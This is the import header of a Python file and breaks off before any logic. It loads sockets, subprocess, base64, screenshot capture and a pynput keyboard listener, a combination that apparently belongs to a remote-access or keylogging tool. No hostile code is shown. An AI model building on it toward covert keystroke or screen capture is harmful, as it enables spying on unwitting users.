import sys
import os
import socket
import time
import base64
import signal
import shlex
import platform
import io
import psutil
import subprocess
import threading
import pyscreenshot
from datetime import datetime
try:
    from pynput.keyboard import Listener
    HAVE_X = True
except Exception:
    HAVE_X = False